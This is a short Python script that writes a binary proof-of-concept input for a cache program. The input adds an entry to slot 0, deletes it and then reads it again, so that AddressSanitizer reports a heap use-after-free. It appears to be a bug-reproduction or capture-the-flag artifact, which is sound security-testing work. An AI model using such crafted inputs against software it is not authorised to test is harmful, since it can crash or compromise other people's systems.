#!/usr/bin/env python3
"""
Generate a PoC that triggers heap-use-after-free in the cache.

Command sequence:
  1. ADD to slot 0: key="AAAA", value="BBBB"
  2. DELETE slot 0: frees the entry but leaves dangling pointer
  3. GET slot 0: dereferences freed memory → ASAN fires

Command format:
  byte 0: command (1=ADD, 2=GET, 3=DELETE)
  For ADD:
    byte 1: slot
    byte 2: key_len
    bytes 3..: key
    next byte: val_len
    next bytes: value
  For GET/DELETE:
    byte 1: slot
"""
import sys

poc = bytearray()

# Command 1: ADD to slot 0, key="AAAA" (len=4), value="BBBB" (len=4)
poc.append(1)       # cmd = ADD
poc.append(0)       # slot = 0
poc.append(4)       # key_len = 4
poc.extend(b"AAAA") # key
poc.append(4)       # val_len = 4
poc.extend(b"BBBB") # value

# Command 2: DELETE slot 0 (frees entry, leaves dangling pointer)
poc.append(3)       # cmd = DELETE
poc.append(0)       # slot = 0

# Command 3: GET slot 0 (dereferences freed memory → UAF)
poc.append(2)       # cmd = GET
poc.append(0)       # slot = 0

sys.stdout.buffer.write(bytes(poc))
